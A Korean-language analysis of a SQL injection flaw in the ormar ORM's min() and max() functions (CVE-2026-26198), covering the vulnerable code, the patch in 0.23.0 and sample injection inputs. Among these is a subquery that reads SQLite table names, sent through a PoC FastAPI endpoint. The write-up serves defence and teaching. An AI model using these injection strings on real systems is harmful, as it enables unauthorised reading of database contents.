# ormar `min()`·`max()` SQL Injection

> 분석 흐름 도식: [analysis.excalidraw](./analysis.excalidraw)

> [`CVE-2026-26198` · `GHSA-xxh2-68g9-8jqr`](https://github.com/advisories/GHSA-xxh2-68g9-8jqr)  
> ormar `0.9.9–0.12.2`, `0.20.0b1–0.22.0` 영향 · `0.23.0`에서 수정

## ormar와 집계 함수

[ormar](https://collerek.github.io/ormar/latest/)는 Python 객체로 데이터베이스를 다룰 수 있게 해 주는 비동기 ORM(Object-Relational Mapper)이다.

ORM은 프로그램의 객체와 데이터베이스의 표를 연결해 주는 도구다.

```text
Python                         데이터베이스

Item 클래스       ↔           items 테이블
item.name         ↔           name 열
item.price        ↔           price 열
Item.objects.max() ↔          SELECT max(...)
```

ORM을 사용하면 개발자가 매번 SQL 문자열을 직접 작성하지 않고 Python의 클래스와 메서드로 조회를 표현할 수 있다.

SQL을 직접 작성하면 다음과 같다.

```sql
SELECT * FROM items WHERE price > 1000;
```

ORM에서는 같은 의도를 Python 메서드로 표현한다.

```python
await Item.objects.filter(price__gt=1000).all()
```

ormar는 이 Python 코드를 내부에서 SQL로 바꾸어 데이터베이스에 전달한다. ORM도 마지막에는 SQL을 만들기 때문에 변환 과정에서 외부 문자열을 raw SQL로 사용하면 SQL Injection이 생길 수 있다.

```python
class Item(ormar.Model):
    id: int = ormar.Integer(primary_key=True)
    name: str = ormar.String(max_length=100)
    price: float = ormar.Float()
```

위 모델의 `Item` 객체는 데이터베이스의 `items` 테이블과 연결되고 `price` 필드는 `price` 열과 연결된다.

`min()`과 `max()`는 지정한 열에서 가장 작은 값과 가장 큰 값을 구하는 집계 함수다.

```python
lowest_price = await Item.objects.min("price")
highest_price = await Item.objects.max("price")
```

개념적으로 다음 SQL과 같은 일을 한다.

```sql
SELECT min(price) FROM items;
SELECT max(price) FROM items;
```

ormar는 한 열뿐 아니라 여러 열과 관계 모델의 열 이름도 문자열로 받는다.

```python
await Book.objects.max(["year", "ranking"])
await Author.objects.max("books__year")
```

## 취약점 요약

`min()`과 `max()`에 전달된 문자열은 실제 모델 필드 이름이어야 한다. 취약 버전은 이 문자열이 모델에 존재하는 필드인지 확인하지 않은 채 SQLAlchemy의 `text()`에 전달했다.

```text
외부의 column 값
    ↓
Item.objects.max(column)
    ↓
QuerySet.max()
    ↓
_query_aggr_function("max", columns)
    ↓
SelectAction(column)
    ↓
sqlalchemy.text(column)
    ↓
SELECT max(<column 입력>) ...
```

따라서 공격자가 `price` 대신 SQL 표현식을 전달하면 ormar는 이를 컬럼명으로 제한하지 않고 그대로 실행할 수 있었다.

## 취약한 코드

`QuerySet.max()`는 문자열 하나를 목록으로 바꾼 뒤 공통 집계 함수로 전달한다.

```python
async def max(self, columns):
    if not isinstance(columns, list):
        columns = [columns]
    return await self._query_aggr_function(
        func_name="max",
        columns=columns,
    )
```

공통 함수 `_query_aggr_function()`은 각 문자열로 `SelectAction`을 만든다.

```python
select_actions = [
    SelectAction(select_str=column, model_cls=self.model)
    for column in columns
]

if func_name in ["sum", "avg"]:
    if any(not action.is_numeric for action in select_actions):
        raise QueryDefinitionError(...)

select_columns = [
    action.apply_func(func, use_label=True)
    for action in select_actions
]
```

여기서 자료형 검사는 `sum()`과 `avg()`일 때만 수행된다. `min()`과 `max()`는 이 조건을 건너뛰었다.

`SelectAction.get_text_clause()`는 마지막으로 필드 문자열을 SQLAlchemy의 `text()`에 넣는다.

```python
def get_text_clause(self):
    alias = f"{self.table_prefix}_" if self.table_prefix else ""
    return sqlalchemy.text(f"{alias}{self.field_name}")
```

`sqlalchemy.text()`는 전달받은 문자열을 SQL 텍스트 표현식으로 만든다. `field_name`이 실제 필드인지 확인되지 않았기 때문에 `price`뿐 아니라 `1+1`이나 서브쿼리도 SQL 표현식이 될 수 있었다.

## `sum()`·`avg()`와 무엇이 달랐나

```text
sum("price") ─┐
avg("price") ─┴─ 숫자 필드인지 확인

min("입력") ─┐
max("입력") ─┴─ 검사 없이 SQL 표현식 생성
```

`sum()`과 `avg()`는 숫자가 아닌 열에 사용할 수 없기 때문에 `is_numeric` 검사를 거쳤다. 존재하지 않는 필드도 이 검사 과정에서 거부됐다.

반면 문자열에도 사용할 수 있는 `min()`과 `max()`는 숫자 검사를 하지 않았고, 별도의 필드 존재 검사도 없었다. 이 차이가 취약한 경로를 만들었다.

## 공격 입력과 생성 SQL

가장 단순한 확인 방법은 컬럼명 대신 산술식 `1+1`을 전달하는 것이다.

```python
result = await Item.objects.max("1+1")
```

정상이라면 `1+1`이라는 필드가 없다는 오류가 발생해야 한다. 취약 버전은 이를 SQL 표현식으로 사용한다.

```sql
SELECT max(1+1) AS "1+1"
FROM (
    SELECT items.id, items.name, items.price
    FROM items
) AS subquery_for_max;
```

DB가 `1+1`을 계산하기 때문에 결과로 `2`가 반환된다. 문자열이 컬럼명으로 검증되지 않고 SQL로 해석됐다는 것을 확인할 수 있다.

공개 advisory는 SQLite의 시스템 테이블을 조회하는 다음 형태도 제시한다.

```python
column = (
    "(SELECT GROUP_CONCAT(name) "
    "FROM sqlite_master WHERE type='table')"
)
result = await Item.objects.max(column)
```

생성되는 SQL의 핵심 부분은 다음과 같다.

```sql
SELECT max(
    (SELECT GROUP_CONCAT(name)
     FROM sqlite_master
     WHERE type='table')
)
FROM (...items 조회...) AS subquery_for_max;
```

`items` 모델의 집계 함수로 시작했지만, 삽입한 서브쿼리는 데이터베이스 안의 다른 테이블 이름까지 조회한다.

## 공개 PoC의 실행 흐름

advisory의 PoC는 FastAPI에 통계 endpoint를 추가한 형태다.

```python
@app.get("/items/stats")
async def item_stats(
    metric: str = "max",
    column: str = "price",
):
    if metric == "max":
        result = await Item.objects.max(column)
    elif metric == "min":
        result = await Item.objects.min(column)
    else:
        return {"error": "Unsupported metric"}

    return {"result": result}
```

정상 요청은 `column=price`를 전달한다.

```http
GET /items/stats?metric=max&column=price
```

취약성 확인 요청은 `column=1+1`을 전달한다. URL에서 `+`는 공백으로 해석될 수 있으므로 실제 요청에서는 URL 인코딩 여부를 확인해야 한다.

```http
GET /items/stats?metric=max&column=1%2B1
```

```json
{"result": 2}
```

FastAPI endpoint는 ormar가 자동으로 만드는 endpoint가 아니다. 애플리케이션이 외부의 `column` 값을 검증 없이 `min()`이나 `max()`에 전달할 때 이 입력 흐름이 만들어진다.

## 패치

ormar `0.23.0`은 집계 SQL을 만들기 전에 모든 필드 이름이 대상 모델에 존재하는지 검사한다.

```python
if any(
    action.field_name not in action.target_model.model_fields
    for action in select_actions
):
    raise QueryDefinitionError(
        "You can use aggregate functions only on "
        "existing columns of the target model"
    )
```

`target_model.model_fields`에는 모델에 정의된 필드 이름이 들어 있다.

```text
Item.model_fields
→ id, name, price
```

패치 후 입력은 다음처럼 처리된다.

```text
price  → Item에 존재하는 필드 → 집계 SQL 생성
1+1    → 존재하지 않는 필드   → QueryDefinitionError
(SELECT ...) → 존재하지 않는 필드 → QueryDefinitionError
```

검사가 `sqlalchemy.text()`보다 먼저 실행되므로 공격 문자열은 SQL 표현식으로 변환되거나 DB로 전달되지 않는다.

패치 커밋 전체는 릴리스 문서와 테스트를 포함해 5개 파일 `+98/-4`다. 실제 검사 로직은 `ormar/queryset/queryset.py`에 추가됐다.

## 참고 자료

- [GitHub Advisory — GHSA-xxh2-68g9-8jqr](https://github.com/advisories/GHSA-xxh2-68g9-8jqr)
- [ormar 패치 커밋](https://github.com/ormar-orm/ormar/commit/a03bae14fe01358d3eaf7e319fcd5db2e4956b16)
- [ormar 0.23.0 릴리스](https://github.com/ormar-orm/ormar/releases/tag/0.23.0)
- [ormar 공식 문서 — Aggregation functions](https://collerek.github.io/ormar/latest/queries/aggregations/)
- [ormar 공식 문서 — Model internals](https://collerek.github.io/ormar/latest/models/internals/)
